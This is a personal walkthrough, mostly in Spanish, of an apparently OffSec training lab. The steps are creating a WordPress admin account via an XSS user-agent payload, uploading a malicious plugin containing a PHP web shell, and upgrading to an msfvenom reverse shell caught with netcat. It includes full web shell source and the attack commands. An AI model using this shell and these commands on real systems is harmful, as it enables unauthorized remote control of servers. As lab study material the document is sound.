# Walk: Ejercicio de reconocimiento

## Fecha: 17/01/2025
## Host: Kali
## IP: 

---

## Objetivo
Capstone Lab: Start Module Exercise VM 1 and add a new administrative account 
like we did in this Learning Unit. Next, craft a WordPress plugin that embeds 
a web shell and exploit it to enumerate the target system. 
Upgrade the web shell to a full reverse shell and obtain the flag located in /tmp/. 
Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.

---
## Herramientas
1. curl 
2. php
3. nc
---
## Procedimiento y comandos
1. Paso 1: Creamos el usuario como en la POC anterior: 
	curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...payload...))</script>" --proxy 127.0.0.1:8080

2. Paso 2: Creamos el plugin malicioso:
	```
		<?php
		/*
			Plugin Name: Malicious Plugin
			Description: A malicious WordPress plugin for reverse shell.
			Version: 1.0
			Author: Attacker
		*/

		// Web shell or reverse shell code here
		if (isset($_GET['cmd'])) {
		    echo "<pre>";
		    system($_GET['cmd']);
		    echo "</pre>";
		}
		?>
	```
3. Paso 3: Subimos el plugin y probamos si por url obtenemos lo que buscamos:
	* Comprimimos el plugin. Nota: el plugin debe cumplir con algunas caracteristicas, debe estar **dentro de una carpeta**, y debe **contener una cabecera**
	1. ** zip -r malicius-plugin-8.4.5.zip malicius-plugin-8.4.5/ **
	* Plugins > add new
	2. ** http://offsecwp/malicious-plugin.php?cmd=whoami**
	- resultado: www-data
4. Paso 4:Generamos el reverse Shell: (Completar paso 4)
	- **msfvenom -p php/reverse_php LHOST=192.168.45.205 LPORT=4444 -f raw > reverse-shell-msfvenom.php**
	- reverse-shell reobusta con msfvenom. Se debe agregar cabecera estandar para plugins.
5. Paso 5: Escuchamos con netcat en el puerto de nuestra preferencia
	- **nc -lnvp 4444**
	- Buscamos el flag en /tmp
---
## Troubleshooting
1. The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature

2. Cabecera del plugin.

3.  nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.205] from (UNKNOWN) [192.168.137.16] 33176
.. se desonecta automaticamente.. 
---

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

